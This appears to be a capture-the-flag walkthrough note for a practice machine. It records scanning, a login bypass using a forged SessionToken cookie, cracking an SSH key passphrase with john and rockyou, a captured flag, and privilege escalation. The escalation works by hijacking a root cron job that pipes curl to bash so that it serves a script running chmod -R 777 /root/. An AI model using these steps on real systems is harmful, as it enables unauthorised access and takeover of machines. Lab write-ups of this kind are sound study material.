#ssh_rsakey
************
# DISCOVERY
************
**nmap**
sudo nmap -sV -O -T4 -p- $TGT
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)


## Website

Passwords never leave PC
Stored in encrypted file

**STAFF**
	Ninja - Lead Developer
	Pars - Shibe Enthusiast and Emotional Support Animal Manager
	Szymex - Head Of Security
	Bee - Chief Drinking Water Coordinator
	MuirlandOracle - Cryptography Consultant

**Web Directories**
	gobuster dir -u http://$TGT -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
		/img                  (Status: 301) [Size: 0] [--> img/]
		/downloads            (Status: 301) [Size: 0] [--> downloads/]
		/aboutus              (Status: 301) [Size: 0] [--> aboutus/]  
		/admin                (Status: 301) [Size: 42] [--> /admin/]  
		/css                  (Status: 301) [Size: 0] [--> css/]  


# Gaining Access
## Web
**/admin**
	View source:
		login.js
	/login.js
		else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
	    }
	In inspector make SessionToken
		Set value to LoggedIn as test (turns out any value is acceptable)
		Access to /admin acheived
	![[../Z - Walkthrough Images/Pasted image 20220915090630.png]]


**SSH KEY**
	User: James
	Save key

## SSH
RSA passphrase for encrypted
	ssh2john jamesrsa > id_rsa.hash
	john -w=/usr/share/wordlists/rockyou.txt id_rsa.hash 
		jamesrsa : james13
This gives the rsa passphrase to login with shh
SSH login
	ssh -i jamesrsa james@10.10.92.70
	passphrase: james13

**USER FLAG**
	cat user.txt
		thm{65c1aaf000506e56996822c6281e6bf7}

# Priv esc
Note mentions automating
	cat /etc/crontab
		# Update builds from latest code
		root curl overpass.thm/downloads/src/buildscript.sh | bash
	Change /etc/hosts overpass.thm to point to own machine
Setup python server with file structure
	Create buildscript.sh to all priv esc
		Set everything to 777 perm in root folder
			>chmod -R 777 /root/;
		